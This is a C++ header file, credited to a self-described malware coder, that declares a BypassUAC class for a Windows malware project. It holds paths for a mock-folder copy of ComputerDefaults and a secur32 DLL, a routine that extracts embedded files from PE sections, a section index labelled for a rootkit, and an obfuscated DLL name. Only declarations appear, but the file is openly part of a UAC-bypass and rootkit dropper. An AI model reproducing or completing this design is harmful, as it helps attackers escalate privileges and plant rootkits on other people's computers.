/*
##################################################
#                                                #
#         Malware Coder: Elliot Alderson         #
#                                                #
#   Github: https://github.com/ElliotAlderson51  #
#                                                #
##################################################
*/

#ifndef BYPASSUAC_H
#define BYPASSUAC_H

#include <Windows.h>
#include <iostream>
#include "Tools.h"

#define RtlOffsetToPointer(Module, Pointer) PBYTE(PBYTE(Module) + DWORD(Pointer))
#define BYPASS_UAC_DLL_NAME  std::string(decode("cuSe32r"))
#define ROOTKIT_SECTION_INDEX 2
#define DLL_SECTION_INDEX 1

class BypassUAC : Tools
{			
	std::string real_ComputerDefaults_path;
	std::string inMockFolder_ComputerDefaults_path;
	std::string secur32_Path;

	BOOL ExtractFileFromSection(PBYTE module_base, const std::string& save_path, const std::string& save_name, const int index_from_the_end);

public:

	BOOL UAC();
	BOOL IsProcessElevated();
};


#endif // !BYPASSUAC_H
